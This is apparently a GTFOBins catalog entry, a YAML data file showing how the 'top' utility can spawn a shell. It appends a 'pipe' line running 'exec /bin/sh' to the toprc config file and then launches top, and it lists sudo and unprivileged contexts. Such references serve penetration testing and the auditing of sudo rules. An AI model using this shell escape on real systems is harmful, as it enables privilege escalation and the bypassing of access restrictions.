<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/top -->
---
functions:
  shell:
  - code: |-
      echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc
      top
      # press return twice
      reset
    comment: |-
      The config path might be different.
    contexts:
      sudo:
      unprivileged:
...
